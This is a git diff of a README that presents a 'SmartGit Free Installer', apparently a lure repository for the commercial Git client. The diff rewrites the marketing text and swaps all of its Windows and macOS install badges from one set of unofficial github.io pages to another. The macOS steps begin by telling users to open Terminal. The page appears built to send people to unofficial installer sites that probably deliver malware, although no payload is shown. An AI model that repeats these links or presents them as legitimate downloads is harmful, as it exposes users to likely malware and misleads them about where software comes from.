@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Git+Client-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 SmartGit Free Installer** — SmartGit is a cross-platform graphical Git client for Windows, macOS, and Linux used by professional developers. Works without internet access, no account required. Full offline installation.
+**💻 SmartGit Free Installer** — SmartGit is a cross-platform Git and Mercurial client with a sophisticated interface supporting interactive rebase, cherry-pick, stash management, and pull request workflows. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install SmartGit](https://img.shields.io/badge/⬇_Install_SmartGit-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SmartGit](https://img.shields.io/badge/⬇_Install_SmartGit-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About SmartGit
 
-SmartGit is a cross-platform graphical Git client for Windows, macOS, and Linux used by professional developers. Features include a log graph, interactive rebase, cherry-pick, worktree management, and integrations with GitHub, GitLab, Bitbucket, and Gerrit. SmartGit's powerful feature set covers nearly all Git operations visually, making it a comprehensive replacement for command-line Git.
+SmartGit is a cross-platform Git and Mercurial client with a sophisticated interface supporting interactive rebase, cherry-pick, stash management, and pull request workflows. Available for Windows, macOS, and Linux with a free license for non-commercial use.
 
 ---
 
 ## ❌ Problem: SmartGit is hard to access
 
-- **Commercial License** — Free for non-commercial use only; commercial use requires subscription
-- **Interface Complexity** — Feature-rich UI takes time to learn thoroughly
-- **Java-Based** — Uses Java runtime for cross-platform support; slight performance overhead
-- **Update Cadence** — Major releases occasionally change workflow conventions
+- **Paid for Commercial Use** — Free only for open source and non-commercial projects
+- **Complex Interface** — Feature-rich UI has a learning curve
+- **Mercurial Declining** — Mercurial support less relevant as Git dominates version control
+- **Competition** — GitKraken and Fork offer more polished visual experiences
 
 ---
 
@@ -61,9 +61,9 @@ SmartGit is a cross-platform graphical Git client for Windows, macOS, and Linux 
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ SmartGit is a cross-platform graphical Git client for Windows, macOS, and Linux 
 
 <div align="center">
 
-[![⬇ Install SmartGit](https://img.shields.io/badge/⬇_Install_SmartGit-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SmartGit](https://img.shields.io/badge/⬇_Install_SmartGit-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ SmartGit is a cross-platform graphical Git client for Windows, macOS, and Linux 
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ SmartGit is a cross-platform graphical Git client for Windows, macOS, and Linux 
 
 ---
 
-**SmartGit Free Installer** — SmartGit is a cross-platform graphical Git client for Windows, macOS, and Linux used by professional developers. Install without internet connection today!
+**SmartGit Free Installer** — SmartGit is a cross-platform Git and Mercurial client with a sophisticated interface supporting interactive rebase, cherry-pick, stash management, and pull request workflows. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install SmartGit](https://img.shields.io/badge/⬇_Install_SmartGit-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install SmartGit](https://img.shields.io/badge/⬇_Install_SmartGit-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
